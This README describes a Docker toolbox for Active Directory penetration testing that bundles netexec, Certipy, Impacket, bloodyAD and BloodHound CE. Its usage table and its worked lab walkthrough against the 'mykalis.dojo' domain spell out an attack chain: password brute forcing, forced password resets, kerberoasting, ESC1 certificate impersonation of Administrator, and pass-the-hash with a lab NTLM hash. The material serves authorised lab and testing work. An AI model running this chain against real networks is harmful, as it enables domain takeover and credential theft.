# AD Pentest Docker

A ready-to-run Docker environment for Active Directory penetration testing.
It ships an **Ubuntu 24.04** toolbox preloaded with the tools used throughout
the `mykalis.dojo` lab, and bundles **BloodHound Community Edition** so the
graph database + web UI come up automatically and stay accessible.

- **Pentest toolbox** — `nxc` (netexec), BloodHound CE ingestor, `bloodyAD`,
  Certipy, Impacket, `kerbrute`, `rpcclient`, `smbclient`, `nmap`, `ffuf`,
  `gobuster`, RDP clients, pivoting tools, and more.
- **BloodHound CE** — PostgreSQL + Neo4j + the BloodHound web UI, wired up and
  started together with the toolbox.

---

## Quick start

```bash
# 1. Clone
git clone https://github.com/<your-user>/penpack.git
cd penpack

# 2. (optional) customize
cp .env.example .env

# 3. Build + start everything in the background
docker compose up -d --build

# 4. Drop into the pentest shell
docker compose exec pentest bash

# 5. Verify all tools are installed
docker compose exec pentest check-tools
```

That's it. BloodHound is now running in the background and reachable at:

```
http://localhost:8080/ui/login
```

---

## BloodHound CE — first login

BloodHound generates a **random initial admin password** on first start. Grab
it from the logs, then set your own password on first login:

```bash
docker compose logs bloodhound | grep -i "Initial Password"
```

Look for a block like:

```
# Initial Password Set To:   <password-here>   #
```

Log in as `admin:<password-here>`, then you will be prompted to choose a new
password. (To reset the password later, set `bhe_recreate_default_admin=true`
in `.env` and restart.)

Default database credentials (internal, for local lab use only):

| Service  | User          | Password                       |
|----------|---------------|--------------------------------|
| Postgres | `bloodhound`  | `bloodhoundcommunityedition`   |
| Neo4j    | `neo4j`       | `bloodhoundcommunityedition`   |

> Change these in `.env` if you expose this anywhere but localhost.

---

## Included tools

| Tool                        | Purpose                                  | Binary / entry point      |
|-----------------------------|------------------------------------------|---------------------------|
| netexec (nxc)               | SMB/LDAP/WinRM/RDP/MSSQL execution & auth | `nxc`, `netexec`          |
| BloodHound CE ingestor      | AD data collection (CE format)           | `bloodhound-ce-python`    |
| bloodyAD                    | LDAP abuse (e.g. `set password`)         | `bloodyAD`                |
| Certipy                     | AD CS enumeration & ESC abuse            | `certipy`                 |
| Impacket                    | `secretsdump.py`, `mssqlclient.py`, etc. | `*.py` scripts            |
| kerbrute                    | Kerberos brute-forcing                   | `kerbrute`                |
| rpcclient / smbclient       | SAMR RPC + SMB client                    | `rpcclient`, `smbclient`  |
| ldapsearch                  | Raw LDAP queries                         | `ldapsearch`              |
| nmap                        | Port / service discovery                 | `nmap`                    |
| ffuf / gobuster             | Web directory & vhost fuzzing            | `ffuf`, `gobuster`        |
| rdesktop / xfreerdp         | RDP clients (GUI / jump boxes)           | `rdesktop`, `xfreerdp`    |
| socat / proxychains4 / ssh  | Pivoting & tunneling                      | `socat`, `proxychains4`   |

`crackmapexec` is intentionally **not** installed — it is deprecated and
superseded by `netexec` (`nxc`), which is drop-in compatible.

### Tool status checker

The image ships a `check-tools` script that verifies every tool is present and
prints a version/status line for each:

```bash
docker compose exec pentest check-tools
```

It exits non-zero if anything is missing, so it can also be used as a
post-build sanity check in CI.

### Running tools without starting the container

You don't have to keep a shell open. Every tool can be run one-off in a
throwaway container (it still gets host networking and the `./data` mount, then
is removed when it exits):

```bash
docker compose run --rm pentest <tool> [args]
```

> Put wordlists/inputs in `./data` on the host — they are available as `/data/...`
> inside the container. Add `-T` to the run command when you don't need a TTY
> (e.g. inside scripts/pipes).

| Tool | One-off example |
|------|-----------------|
| nxc / netexec | `docker compose run --rm pentest nxc smb 10.8.0.100 -u user -p pass` |
| certipy | `docker compose run --rm pentest certipy find -u user@dom -p pass -dc-ip 10.8.0.100` |
| bloodyAD | `docker compose run --rm pentest bloodyAD --host 10.8.0.100 -d dom -u user -p pass set password victim 'Pw!'` |
| kerbrute | `docker compose run --rm pentest kerbrute bruteuser -d DOM --dc 10.8.0.100 /data/rockyou.txt user` |
| bloodhound-ce-python | `docker compose run --rm pentest bloodhound-ce-python -u user -p pass -d dom -ns 10.8.0.100 -c All --zip` |
| secretsdump.py | `docker compose run --rm pentest secretsdump.py dom/user:pass@10.8.0.100` |
| GetNPUsers.py | `docker compose run --rm pentest GetNPUsers.py dom/ -dc-ip 10.8.0.100 -usersfile /data/users.txt` |
| mssqlclient.py | `docker compose run --rm pentest mssqlclient.py dom/user:pass@10.8.0.100` |
| psexec.py | `docker compose run --rm pentest psexec.py dom/user:pass@10.8.0.100` |
| smbclient.py | `docker compose run --rm pentest smbclient.py dom/user:pass@10.8.0.100` |
| wmiexec.py | `docker compose run --rm pentest wmiexec.py dom/user:pass@10.8.0.100` |
| rpcclient | `docker compose run --rm pentest rpcclient -U 'user%pass' 10.8.0.100` |
| smbclient | `docker compose run --rm pentest smbclient -L //10.8.0.100 -U user` |
| ldapsearch | `docker compose run --rm pentest ldapsearch -H ldap://10.8.0.100 -x -b 'DC=dom,DC=local'` |
| nmap | `docker compose run --rm pentest nmap -A -p- 10.8.0.100` |
| ffuf | `docker compose run --rm pentest ffuf -u https://target/FUZZ -w /data/wordlist.txt` |
| gobuster | `docker compose run --rm pentest gobuster dir -u https://target -w /data/wordlist.txt -k` |
| rdesktop | `docker compose run --rm pentest rdesktop -u user -p pass 10.8.0.100` |
| xfreerdp | `docker compose run --rm pentest xfreerdp /v:10.8.0.100 /u:user /p:pass /cert:ignore` |
| socat | `docker compose run --rm pentest socat TCP-LISTEN:8080,fork TCP:target:80` |
| proxychains4 | `docker compose run --rm pentest proxychains4 nmap -sT -Pn target` |
| openssl | `docker compose run --rm pentest openssl s_client -connect target:443` |
| sshpass | `docker compose run --rm pentest sshpass -p pass ssh user@target` |
| check-tools | `docker compose run --rm pentest check-tools` |

> **GUI tools** (`rdesktop`, `xfreerdp`) need an X display. From a Linux host
> with `DISPLAY` set, forward it with `docker compose run --rm -e DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix pentest rdesktop ...`.

---

## Network model

The `pentest` container uses `network_mode: host`. This is deliberate:

- It inherits the host's VPN interface (`tun0`), so you can reach your lab
  targets (e.g. `10.8.0.0/24`) directly from inside the container.
- It reaches BloodHound at `http://localhost:8080`.

The BloodHound stack runs on an internal Docker network and publishes only the
web UI (`8080`) to the host.

---

## Per-engagement isolation

Run a **named engagement** with its own isolated data volume and BloodHound
database. Each engagement lives under `engagements/<name>/data` (mounted at
`/data` inside the container), and its BloodHound Postgres + Neo4j volumes are
isolated via the Docker Compose project name.

```bash
# start a new engagement (creates engagements/<name>/data)
./engage.sh mykalis-2026-11

# work inside it
docker compose -p mykalis-2026-11 exec pentest bash
docker compose -p mykalis-2026-11 run --rm pentest nmap -A -p- 10.8.0.100
# BloodHound UI: http://localhost:8080/ui/login

# stop it (data volume is kept)
docker compose -p mykalis-2026-11 down
```

Run several engagements at once by giving each a different BloodHound port:

```bash
./engage.sh client-a 8080
./engage.sh client-b 8081
```

### Encrypt an engagement when it's done

Archive + encrypt the engagement's data directory (AES-256, passphrase):

```bash
./encrypt.sh mykalis-2026-11                 # -> engagements/mykalis-2026-11.tar.gz.gpg
# then wipe the plaintext data dir if you like
rm -rf engagements/mykalis-2026-11/data
```

Non-interactive (for scripting/CI) or asymmetric (to a GPG key):

```bash
GPG_PASSPHRASE='your-secret' ./encrypt.sh mykalis-2026-11
GPG_RECIPIENT=you@example.com ./encrypt.sh mykalis-2026-11
```

Restore later:

```bash
./decrypt.sh engagements/mykalis-2026-11.tar.gz.gpg engagements/mykalis-2026-11
```

> The encrypted archive contains the `data/` directory only (scans, hashes,
> certs, BloodHound collection zips). The BloodHound graph itself is re-derivable
> by re-importing those zips into the UI.

---

## Worked example — mykalis.dojo

The exact workflow this image was built for:

```bash
# recon
nmap -A -n -p- 10.8.0.100
nmap -A -n -p- 10.8.0.101          # -> look for SMTP/443 => check /owa

# brute force
nxc smb 10.8.0.100 -d mykalis.dojo -u labdullah -p rockyou.txt --ignore-pw-decoding
kerbrute bruteuser -d MYKALIS.DOJO --dc 10.8.0.100 ./rockyou.txt labdullah

# collect AD data for BloodHound (upload the zip into the web UI)
bloodhound-ce-python -u labdullah -p 'P@ssw0rd' -d mykalis.dojo -ns 10.8.0.100 -c All --zip

# abuse delegated password reset
bloodyAD --host 10.8.0.100 -d mykalis.dojo -u labdullah -p 'P@ssw0rd' set password eobrien 'TempPass123!'
# ... or via SAMR:
rpcclient -U 'labdullah%P@ssw0rd' 10.8.0.100 -c 'setuserinfo2 eobrien 23 "TempPass123!"'

# kerberoast + verify the cracked password
nxc ldap 10.8.0.100 -d mykalis.dojo -u labdullah -p 'P@ssw0rd' --kerberoasting krb.txt
nxc smb 10.8.0.100 -u svc_sql -p 'PasswordStrongAuth!2025Mykalis'

# AD CS -> ESC1
certipy find -u svc_sql -p 'PasswordStrongAuth!2025Mykalis' -dc-ip 10.8.0.100 -stdout -vulnerable
certipy req -u 'svc_sql@mykalis.dojo' -p 'PasswordStrongAuth!2025Mykalis' \
  -dc-ip 10.8.0.100 -ca 'mykalis-DC-CA' -template 'Web-Server' \
  -upn 'administrator@mykalis.dojo' -sid 'S-1-5-21-718436270-1213841202-3127682982-500' \
  -out administrator.pfx -timeout 60
certipy auth -pfx administrator.pfx -dc-ip 10.8.0.100

# domain admin
nxc smb 10.8.0.100 -u "Administrator" -H aad3b435b51404eeaad3b435b51404ee:d4223ef45c991e27c2339827948a1828 \
  -x 'type C:\Users\Administrator\Desktop\proof.txt'
```

---

## Useful commands

```bash
docker compose up -d --build   # build + start everything
docker compose ps              # status
docker compose logs -f bloodhound   # watch BloodHound startup (find admin pw)
docker compose exec pentest bash    # enter the toolbox
docker compose down            # stop (keep data)
docker compose down --volumes # stop + wipe the databases
```

---

## Data persistence

Anything you write to `/data` inside the pentest container lands in `./data` on
the host (mounted volume). BloodHound's Postgres and Neo4j data persist in the
`postgres-data` and `neo4j-data` Docker volumes.
